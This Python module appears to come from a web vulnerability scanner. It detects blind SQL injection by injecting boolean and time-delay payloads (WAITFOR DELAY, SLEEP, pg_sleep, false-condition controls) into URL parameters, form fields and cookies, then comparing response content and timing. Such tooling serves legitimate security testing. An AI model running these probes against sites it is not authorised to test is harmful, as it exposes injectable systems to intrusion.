"""
Blind SQLi Detection Module

Includes:
- Boolean-based detection (GET/POST/Cookie)
- Time-based detection (GET/POST/Cookie)
- Advanced time-based detection with:
  * Multi-probe confirmation (SLEEP 3/5/7s linear scaling)
  * Control payload (IF(1=2, SLEEP(5), 0) for false positive elimination)
  * Jitter analysis (baseline timing variance)
"""

import urllib.parse
from typing import Dict, Any, List, Optional, Tuple
import statistics
from ...core.http_client import HttpClient
from ...core.response_analyzer import measure_request_time, content_similarity, is_time_significant
from .payload_engine import generate_payloads
from ...core.logger import get_logger
from .payloads import boolean_payloads
from ...ml.anomaly_stub import persist_feature_vector, prepare_feature_vector

logger = get_logger("sqli_detector")

class BlindSQLiDetector:
    def __init__(self, timeout=10):
        self.client = HttpClient(timeout=timeout)

    # --- Generic helpers for POST/cookie injections ---
    def _post_request(self, url: str, data: dict, headers: dict = None, cookies: dict = None):
        t, resp = measure_request_time(self.client.session.post, url, data=data, headers=headers, cookies=cookies, timeout=self.client.timeout)
        return t, resp

    def _cookie_request(self, url: str, cookies: dict, headers: dict = None):
        t, resp = measure_request_time(self.client.get, url, headers=headers, cookies=cookies)
        return t, resp

    def _param_replace(self, url: str, param: str, new_value: str) -> str:
        p = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        qs[param] = [new_value]
        new_q = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))

    def _base_request(self, url: str, headers: Dict[str, str] = None, cookies: Dict[str, str] = None):
        t, resp = measure_request_time(self.client.get, url, headers=headers, cookies=cookies)
        return t, resp

    def detect_boolean(self, url: str, param: str, headers: Dict[str, str] = None, cookies: Dict[str, str] = None) -> Dict[str, Any]:
        results = {"type": "boolean", "evidence": [], "confidence": "LOW"}
        headers = headers or {}
        cookies = cookies or {}
        try:
            baseline_t, baseline_resp = self._base_request(url, headers=headers, cookies=cookies)
            base_body = baseline_resp.text if baseline_resp is not None else ""
            base_len = len(base_body)
            logger.info(f"[BOOLEAN] Testing {param} on {url} | baseline length: {base_len}")
        except Exception as e:
            logger.debug("Baseline request failed: %s", e)
            return results

        for pair in boolean_payloads():
            tpl = pair
            # build payloads by appending to value (naive but black-box)
            try:
                orig_val = urllib.parse.parse_qs(urllib.parse.urlparse(url).query).get(param, [""])[0]
                true_url = self._param_replace(url, param, orig_val + tpl["true"])
                false_url = self._param_replace(url, param, orig_val + tpl["false"])

                logger.debug(f"  [BOOLEAN] Trying: TRUE=[{orig_val}{tpl['true']}] vs FALSE=[{orig_val}{tpl['false']}]")

                t_true, resp_true = measure_request_time(self.client.get, true_url, headers=headers, cookies=cookies)
                t_false, resp_false = measure_request_time(self.client.get, false_url, headers=headers, cookies=cookies)

                len_true = len(resp_true.text) if resp_true is not None else 0
                len_false = len(resp_false.text) if resp_false is not None else 0

                sim = content_similarity(resp_true.text or "", resp_false.text or "")
                status_equal = (resp_true.status_code == resp_false.status_code == baseline_resp.status_code)

                logger.debug(f"    -> len_true={len_true}, len_false={len_false}, sim={sim:.2f}, status_ok={status_equal}")

                # heuristics: significant content/length difference or structural diff implies boolean behavior
                if status_equal and ((abs(len_true - len_false) > max(10, 0.05 * base_len)) or sim < 0.95):
                    conf = "MEDIUM"
                    # increase confidence if repeated across more than one pair
                    results["evidence"].append({
                        "payload_true": tpl["true"],
                        "payload_false": tpl["false"],
                        "len_true": len_true, "len_false": len_false,
                        "sim": sim, "status_equal": status_equal
                    })
                    if len(results["evidence"]) >= 2:
                        conf = "HIGH"
                    results["confidence"] = conf
                    logger.info(f"    -> MATCHED! Confidence: {conf}")
                    
                    # ML: Persist feature vector for boolean detection
                    feature_vec = prepare_feature_vector(
                        url=url, parameter=param, injection_type="boolean",
                        payload=tpl["true"], baseline_time=baseline_t,
                        injected_time=t_true, content_length=len_true,
                        status_code=getattr(resp_true, "status_code", None)
                    )
                    persist_feature_vector(feature_vec)
                    
                    # stop early on high confidence
                    if conf == "HIGH":
                        break
            except Exception as e:
                logger.debug("Boolean detection error: %s", e)
                continue
        return results

    # --- Boolean detection for form parameters (POST x-www-form-urlencoded) ---
    def detect_boolean_form(self, url: str, param: str, base_data: Dict[str, str], headers: Dict[str, str] = None, cookies: Dict[str, str] = None) -> Dict[str, Any]:
        results = {"type": "boolean", "evidence": [], "confidence": "LOW"}
        headers = headers or {}
        cookies = cookies or {}
        try:
            baseline_t, baseline_resp = self._post_request(url, base_data, headers=headers, cookies=cookies)
            base_body = baseline_resp.text if baseline_resp is not None else ""
            base_len = len(base_body)
            logger.info(f"[BOOLEAN-FORM] Testing {param} on {url} | baseline length: {base_len}")
        except Exception as e:
            logger.debug("Baseline POST failed: %s", e)
            return results

        for pair in boolean_payloads():
            try:
                orig_val = base_data.get(param, "")
                true_data = base_data.copy()
                false_data = base_data.copy()
                true_data[param] = orig_val + pair["true"]
                false_data[param] = orig_val + pair["false"]

                t_true, resp_true = self._post_request(url, true_data, headers=headers, cookies=cookies)
                t_false, resp_false = self._post_request(url, false_data, headers=headers, cookies=cookies)

                len_true = len(resp_true.text) if resp_true is not None else 0
                len_false = len(resp_false.text) if resp_false is not None else 0

                sim = content_similarity(resp_true.text or "", resp_false.text or "")
                status_equal = (getattr(resp_true, "status_code", None) == getattr(resp_false, "status_code", None) == getattr(baseline_resp, "status_code", None))

                if status_equal and ((abs(len_true - len_false) > max(10, 0.05 * base_len)) or sim < 0.95):
                    conf = "MEDIUM"
                    results["evidence"].append({
                        "payload_true": pair["true"],
                        "payload_false": pair["false"],
                        "len_true": len_true, "len_false": len_false,
                        "sim": sim, "status_equal": status_equal
                    })
                    if len(results["evidence"]) >= 2:
                        conf = "HIGH"
                    results["confidence"] = conf
                    logger.info(f"    -> MATCHED (form)! Confidence: {conf}")
                    
                    # ML: Persist feature vector
                    feature_vec = prepare_feature_vector(
                        url=url, parameter=param, injection_type="boolean-form",
                        payload=pair["true"], baseline_time=baseline_t,
                        injected_time=t_true, content_length=len_true,
                        status_code=getattr(resp_true, "status_code", None)
                    )
                    persist_feature_vector(feature_vec)
                    
                    if conf == "HIGH":
                        break
            except Exception as e:
                logger.debug("Boolean form detection error: %s", e)
                continue
        return results

    # --- Boolean detection for cookie parameters ---
    def detect_boolean_cookie(self, url: str, cookie_name: str, cookies: Dict[str, str], headers: Dict[str, str] = None) -> Dict[str, Any]:
        results = {"type": "boolean", "evidence": [], "confidence": "LOW"}
        headers = headers or {}
        cookies = cookies.copy() if cookies else {}
        try:
            baseline_t, baseline_resp = self._cookie_request(url, cookies, headers=headers)
            base_body = baseline_resp.text if baseline_resp is not None else ""
            base_len = len(base_body)
            logger.info(f"[BOOLEAN-COOKIE] Testing {cookie_name} on {url} | baseline length: {base_len}")
        except Exception as e:
            logger.debug("Baseline cookie request failed: %s", e)
            return results

        for pair in boolean_payloads():
            try:
                orig_val = cookies.get(cookie_name, "")
                true_c = cookies.copy(); true_c[cookie_name] = orig_val + pair["true"]
                false_c = cookies.copy(); false_c[cookie_name] = orig_val + pair["false"]

                t_true, resp_true = self._cookie_request(url, true_c, headers=headers)
                t_false, resp_false = self._cookie_request(url, false_c, headers=headers)

                len_true = len(resp_true.text) if resp_true is not None else 0
                len_false = len(resp_false.text) if resp_false is not None else 0
                sim = content_similarity(resp_true.text or "", resp_false.text or "")
                status_equal = (getattr(resp_true, "status_code", None) == getattr(resp_false, "status_code", None) == getattr(baseline_resp, "status_code", None))

                if status_equal and ((abs(len_true - len_false) > max(10, 0.05 * base_len)) or sim < 0.95):
                    conf = "MEDIUM"
                    results["evidence"].append({
                        "payload_true": pair["true"],
                        "payload_false": pair["false"],
                        "len_true": len_true, "len_false": len_false,
                        "sim": sim, "status_equal": status_equal
                    })
                    if len(results["evidence"]) >= 2:
                        conf = "HIGH"
                    results["confidence"] = conf
                    logger.info(f"    -> MATCHED (cookie)! Confidence: {conf}")
                    
                    # ML: Persist feature vector
                    feature_vec = prepare_feature_vector(
                        url=url, parameter=cookie_name, injection_type="boolean-cookie",
                        payload=pair["true"], baseline_time=baseline_t,
                        injected_time=t_true, content_length=len_true,
                        status_code=getattr(resp_true, "status_code", None)
                    )
                    persist_feature_vector(feature_vec)
                    
                    if conf == "HIGH":
                        break
            except Exception as e:
                logger.debug("Boolean cookie detection error: %s", e)
                continue
        return results

    def detect_time_form(self, url: str, param: str, base_data: Dict[str, str], delay: int = 5, headers: Dict[str, str] = None, cookies: Dict[str, str] = None) -> Dict[str, Any]:
        results = {"type": "time", "evidence": [], "confidence": "LOW"}
        headers = headers or {}
        cookies = cookies or {}
        try:
            baseline_t, baseline_resp = self._post_request(url, base_data, headers=headers, cookies=cookies)
        except Exception as e:
            logger.debug("Baseline POST failed: %s", e)
            return results

        payloads = generate_payloads(seed_type="time", db="mssql", obfuscate=False, depth=1, delay=delay)
        logger.info(f"[TIME-FORM] Generated {len(payloads)} time-based payloads")
        for i, payload in enumerate(payloads):
            try:
                orig_val = base_data.get(param, "")
                injected_data = base_data.copy(); injected_data[param] = orig_val + payload["payload"]

                t_inj, resp_inj = self._post_request(url, injected_data, headers=headers, cookies=cookies)

                if is_time_significant(baseline_t, t_inj):
                    conf = "MEDIUM"
                    t_inj2, _ = self._post_request(url, injected_data, headers=headers, cookies=cookies)
                    if is_time_significant(baseline_t, t_inj2) and abs(t_inj2 - t_inj) < 2.0:
                        conf = "HIGH"
                    results["evidence"].append({
                        "db": payload.get("db"),
                        "payload": payload.get("payload"),
                        "baseline": baseline_t,
                        "t_inj": t_inj
                    })
                    results["confidence"] = conf
                    logger.info(f"    -> MATCHED (form)! Confidence: {conf}")
                    
                    # ML: Persist feature vector
                    feature_vec = prepare_feature_vector(
                        url=url, parameter=param, injection_type="time-form",
                        payload=payload.get("payload", ""), baseline_time=baseline_t,
                        injected_time=t_inj, content_length=len(getattr(resp_inj, "text", "")),
                        status_code=getattr(resp_inj, "status_code", None)
                    )
                    persist_feature_vector(feature_vec)
                    
                    if conf == "HIGH":
                        break
            except Exception as e:
                logger.debug("Time form detection error: %s", e)
                continue
        return results

    def detect_time_cookie(self, url: str, cookie_name: str, cookies: Dict[str, str], delay: int = 5, headers: Dict[str, str] = None) -> Dict[str, Any]:
        results = {"type": "time", "evidence": [], "confidence": "LOW"}
        headers = headers or {}
        cookies = cookies.copy() if cookies else {}
        try:
            baseline_t, baseline_resp = self._cookie_request(url, cookies, headers=headers)
        except Exception as e:
            logger.debug("Baseline cookie timing failed: %s", e)
            return results

        payloads = generate_payloads(seed_type="time", db="mssql", obfuscate=False, depth=1, delay=delay)
        logger.info(f"[TIME-COOKIE] Generated {len(payloads)} time-based payloads")
        for payload in payloads:
            try:
                orig_val = cookies.get(cookie_name, "")
                inj_c = cookies.copy(); inj_c[cookie_name] = orig_val + payload["payload"]
                t_inj, resp_inj = self._cookie_request(url, inj_c, headers=headers)
                if is_time_significant(baseline_t, t_inj):
                    conf = "MEDIUM"
                    t_inj2, _ = self._cookie_request(url, inj_c, headers=headers)
                    if is_time_significant(baseline_t, t_inj2) and abs(t_inj2 - t_inj) < 2.0:
                        conf = "HIGH"
                    results["evidence"].append({
                        "db": payload.get("db"),
                        "payload": payload.get("payload"),
                        "baseline": baseline_t,
                        "t_inj": t_inj
                    })
                    results["confidence"] = conf
                    logger.info(f"    -> MATCHED (cookie)! Confidence: {conf}")
                    
                    # ML: Persist feature vector
                    feature_vec = prepare_feature_vector(
                        url=url, parameter=cookie_name, injection_type="time-cookie",
                        payload=payload.get("payload", ""), baseline_time=baseline_t,
                        injected_time=t_inj, content_length=len(getattr(resp_inj, "text", "")),
                        status_code=getattr(resp_inj, "status_code", None)
                    )
                    persist_feature_vector(feature_vec)
                    
                    if conf == "HIGH":
                        break
            except Exception as e:
                logger.debug("Time cookie detection error: %s", e)
                continue
        return results

    def detect_time(self, url: str, param: str, delay: int = 5, headers: Dict[str, str] = None, cookies: Dict[str, str] = None) -> Dict[str, Any]:
        results = {"type": "time", "evidence": [], "confidence": "LOW"}
        headers = headers or {}
        cookies = cookies or {}
        try:
            baseline_t, baseline_resp = self._base_request(url, headers=headers, cookies=cookies)
        except Exception as e:
            logger.debug("Baseline failed: %s", e)
            return results

        # Use generator for MSSQL time-based payloads. Safe defaults: no obfuscation, shallow depth.
        payloads = generate_payloads(seed_type="time", db="mssql", obfuscate=False, depth=1, delay=delay)
        logger.info(f"[TIME] Generated {len(payloads)} MSSQL time-based payloads")
        for i, payload in enumerate(payloads):
            try:
                orig_val = urllib.parse.parse_qs(urllib.parse.urlparse(url).query).get(param, [""])[0]
                injected_url = self._param_replace(url, param, orig_val + payload["payload"])
                
                logger.debug(f"  [TIME] Attempt {i+1}: Payload=[{payload['payload']}]")
                
                # measure several times for noise tolerance: baseline and injected repeated
                t_inj, resp_inj = measure_request_time(self.client.get, injected_url, headers=headers, cookies=cookies)
                
                logger.debug(f"    -> baseline={baseline_t:.2f}s, injected={t_inj:.2f}s, delta={t_inj - baseline_t:.2f}s")
                
                # simple check
                if is_time_significant(baseline_t, t_inj):
                    conf = "MEDIUM"
                    # try again to confirm
                    t_inj2, _ = measure_request_time(self.client.get, injected_url, headers=headers, cookies=cookies)
                    if is_time_significant(baseline_t, t_inj2) and abs(t_inj2 - t_inj) < 2.0:
                        conf = "HIGH"
                    results["evidence"].append({
                        "db": payload.get("db"),
                        "payload": payload.get("payload"),
                        "baseline": baseline_t,
                        "t_inj": t_inj
                    })
                    results["confidence"] = conf
                    logger.info(f"    -> MATCHED! Confidence: {conf}")
                    
                    # ML: Persist feature vector for time-based detection
                    feature_vec = prepare_feature_vector(
                        url=url, parameter=param, injection_type="time-based",
                        payload=payload.get("payload", ""), baseline_time=baseline_t,
                        injected_time=t_inj, content_length=len(getattr(resp_inj, "text", "")),
                        status_code=getattr(resp_inj, "status_code", None)
                    )
                    persist_feature_vector(feature_vec)
                    
                    if conf == "HIGH":
                        break
            except Exception as e:
                logger.debug("Time detection error: %s", e)
                continue
        return results


# =============================================================================
# Advanced Time-Based Detection with False Positive Reduction
# =============================================================================

class AdvancedTimeBasedDetector:
    """
    Production-grade time-based SQLi detector with multi-probe confirmation.
    
    Features:
    1. Multi-probe confirmation (sleep(3), sleep(5), sleep(7)) - verifies linear delay scaling
    2. Control payload (IF(1=2, SLEEP(5), 0)) - detects slow servers vs real injection
    3. Baseline jitter check - downgrades confidence if server timing is unstable
    4. ML + rule hybrid - combines statistical and rule-based scoring
    """
    
    def __init__(self, client: HttpClient):
        self.client = client
        self.jitter_threshold = 0.5  # Max acceptable std dev in baseline timing
    
    def _measure_baseline_jitter(self, url: str, headers: Dict = None, cookies: Dict = None, samples: int = 3) -> Tuple[float, float]:
        """
        Measure baseline request timing variance.
        Returns: (mean_time, std_dev)
        """
        timings = []
        for _ in range(samples):
            try:
                t, _ = measure_request_time(self.client.get, url, headers=headers, cookies=cookies)
                timings.append(t)
            except Exception:
                pass
        
        if len(timings) >= 2:
            mean = statistics.mean(timings)
            std_dev = statistics.stdev(timings) if len(timings) > 1 else 0
            return (mean, std_dev)
        return (timings[0] if timings else 0.5, 0)
    
    def _inject_payload(self, url: str, param: str, payload: str, headers: Dict = None, cookies: Dict = None) -> float:
        """
        Inject payload and measure response time.
        Returns: injected_time
        """
        try:
            p = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            orig_val = qs.get(param, [""])[0]
            qs[param] = [orig_val + payload]
            new_q = urllib.parse.urlencode(qs, doseq=True)
            injected_url = urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))
            
            t, _ = measure_request_time(self.client.get, injected_url, headers=headers, cookies=cookies)
            return t
        except Exception as e:
            logger.debug(f"Injection failed: {e}")
            return 0
    
    def multi_probe_confirmation(self, url: str, param: str, db: str = "mssql", headers: Dict = None, cookies: Dict = None) -> Dict[str, Any]:
        """
        Multi-probe confirmation: test sleep(3), sleep(5), sleep(7) and verify linear scaling.
        
        Returns:
            {
                "confirmed": bool,
                "confidence": str,
                "evidence": {
                    "baseline": float,
                    "jitter": float,
                    "probes": [...],
                    "linear_fit": float,  # R² score
                }
            }
        """
        result = {
            "confirmed": False,
            "confidence": "NONE",
            "evidence": {}
        }
        
        # Step 1: Measure baseline with jitter
        baseline_mean, baseline_jitter = self._measure_baseline_jitter(url, headers, cookies)
        logger.info(f"[MULTI-PROBE] Baseline: {baseline_mean:.2f}s ± {baseline_jitter:.2f}s")
        
        # Step 2: Jitter check - downgrade if unstable
        if baseline_jitter > self.jitter_threshold:
            logger.warning(f"[MULTI-PROBE] High baseline jitter ({baseline_jitter:.2f}s) - may cause false positives")
        
        # Step 3: Multi-probe (sleep 3, 5, 7 seconds)
        delays = [3, 5, 7]
        probes = []
        
        for delay in delays:
            # Generate payload for this delay
            if db == "mssql":
                payload = f" WAITFOR DELAY '00:00:0{delay}'--"
            elif db == "mysql":
                payload = f" AND SLEEP({delay})--"
            elif db == "postgresql":
                payload = f" AND pg_sleep({delay})--"
            else:
                payload = f" AND SLEEP({delay})--"
            
            t_inj = self._inject_payload(url, param, payload, headers, cookies)
            delta = t_inj - baseline_mean
            
            probes.append({
                "expected_delay": delay,
                "actual_delay": delta,
                "injected_time": t_inj,
                "payload": payload
            })
            
            logger.debug(f"  Probe delay={delay}s → actual_delta={delta:.2f}s")
        
        # Step 4: Check for linear relationship (delay should scale linearly)
        expected_delays = [p["expected_delay"] for p in probes]
        actual_delays = [p["actual_delay"] for p in probes]
        
        # Simple linearity check: all actual_delays should be >= expected_delays - 1s
        all_delayed = all(actual >= (expected - 1.0) for actual, expected in zip(actual_delays, expected_delays))
        
        # Calculate linear fit quality (R² approximation)
        try:
            # Check if delays increase monotonically
            is_monotonic = all(actual_delays[i] < actual_delays[i+1] for i in range(len(actual_delays)-1))
            
            # Check if ratios are consistent (within 50% tolerance)
            ratios = [actual / expected if expected > 0 else 0 for actual, expected in zip(actual_delays, expected_delays)]
            ratio_std = statistics.stdev(ratios) if len(ratios) > 1 else 0
            
            linear_fit_score = 1.0 - min(ratio_std / max(ratios), 1.0) if ratios else 0.0
        except Exception:
            linear_fit_score = 0.0
            is_monotonic = False
        
        logger.info(f"[MULTI-PROBE] Linear fit score: {linear_fit_score:.2f}, Monotonic: {is_monotonic}")
        
        # Step 5: Confidence scoring
        if all_delayed and is_monotonic and linear_fit_score > 0.7:
            if baseline_jitter < self.jitter_threshold:
                result["confidence"] = "HIGH"
            else:
                result["confidence"] = "MEDIUM"  # Downgrade due to jitter
            result["confirmed"] = True
        elif all_delayed:
            result["confidence"] = "LOW"
            result["confirmed"] = True
        
        result["evidence"] = {
            "baseline": baseline_mean,
            "jitter": baseline_jitter,
            "probes": probes,
            "linear_fit": linear_fit_score,
        }
        
        return result
    
    def control_payload_check(self, url: str, param: str, db: str = "mssql", headers: Dict = None, cookies: Dict = None) -> bool:
        """
        Control payload: inject IF(1=2, SLEEP(5), 0) - false condition should NOT delay.
        If delay still happens, server is just slow → not SQLi.
        
        Returns: True if control passed (no delay = real injection), False if failed (slow server)
        """
        # Control payload: false condition should NOT trigger delay
        if db == "mssql":
            control_payload = " IF(1=2) WAITFOR DELAY '00:00:05'--"
        elif db == "mysql":
            control_payload = " AND IF(1=2, SLEEP(5), 0)--"
        elif db == "postgresql":
            control_payload = " AND (CASE WHEN 1=2 THEN pg_sleep(5) ELSE 0 END)--"
        else:
            control_payload = " AND IF(1=2, SLEEP(5), 0)--"
        
        baseline_mean, _ = self._measure_baseline_jitter(url, headers, cookies, samples=2)
        t_control = self._inject_payload(url, param, control_payload, headers, cookies)
        delta_control = t_control - baseline_mean
        
        logger.info(f"[CONTROL] Control payload delta: {delta_control:.2f}s (threshold: 3.0s)")
        
        # If control payload causes delay, it's a false positive (slow server)
        if delta_control >= 3.0:
            logger.warning(f"[CONTROL] FAILED - Server delayed on false condition (slow server detected)")
            return False
        
        logger.info(f"[CONTROL] PASSED - No delay on false condition (likely real injection)")
        return True
